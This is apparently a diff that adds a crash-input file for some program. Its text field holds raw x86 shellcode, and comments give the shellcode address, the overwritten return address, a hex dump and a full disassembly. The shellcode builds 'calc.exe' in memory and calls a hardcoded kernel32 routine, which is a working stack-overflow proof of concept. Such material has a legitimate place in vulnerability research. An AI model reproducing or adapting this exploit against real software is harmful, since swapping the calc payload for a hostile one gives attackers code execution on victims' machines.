@@ -1,0 +1,35 @@
+%Crash
+{
+#text="¸ ÞuÆ@cÆ@aÆ@lÆ@cÆ@.Æ@eÆ@xÆ@e@º+ÙujPÿÒÃÄð"
+
+// 0019F0C4 - address of first shellcode instruction, bytecode: Äð
+//  - nop
+// Äð" - return address; quote will be replaced with '\0'
+
+// Shellcode
+// ¸ ÞuÆ@cÆ@aÆ@lÆ@cÆ@.Æ@eÆ@xÆ@e@º+ÙujPÿÒÃ
+
+// CPU Dump
+// Address   Hex dump                                         ASCII (ANSI - êèð>
+// 00401000  B8 A0 0F DE|75 C6 40 01|63 C6 40 02|61 C6 40 03| ¸ ÞuÆ@cÆ@aÆ@
+// 00401010  6C C6 40 04|63 C6 40 05|2E C6 40 06|65 C6 40 07| lÆ@cÆ@.Æ@eÆ@
+// 00401020  78 C6 40 08|65 40 BA 02|2B D9 75 6A|05 50 FF D2| xÆ@e@º+ÙujPÿÒ
+// 00401030  C3                                             | Ã
+//
+// CPU Disasm
+// Address   Hex dump          Command                                  Comments
+// 00401000  /$  B8 A00FDE75   MOV EAX,75DE0FA0
+// 00401005  |.  C640 01 63    MOV BYTE PTR DS:[EAX+1],63
+// 00401009  |.  C640 02 61    MOV BYTE PTR DS:[EAX+2],61
+// 0040100D  |.  C640 03 6C    MOV BYTE PTR DS:[EAX+3],6C
+// 00401011  |.  C640 04 63    MOV BYTE PTR DS:[EAX+4],63
+// 00401015  |.  C640 05 2E    MOV BYTE PTR DS:[EAX+5],2E
+// 00401019  |.  C640 06 65    MOV BYTE PTR DS:[EAX+6],65
+// 0040101D  |.  C640 07 78    MOV BYTE PTR DS:[EAX+7],78
+// 00401021  |.  C640 08 65    MOV BYTE PTR DS:[EAX+8],65
+// 00401025  |.  40            INC EAX
+// 00401026  |.  BA 022BD975   MOV EDX,75D92B02                         ; Entry point
+// 0040102B  |.  6A 05         PUSH 5                                   ; /Arg2 = 5
+// 0040102D  |.  50            PUSH EAX                                 ; |Arg1 => KERNEL32.75DE0FA1
+// 0040102E  |.  FFD2          CALL EDX                                 ; \KERNEL32.75D92B02
+// 00401030  \.  C3            RETN
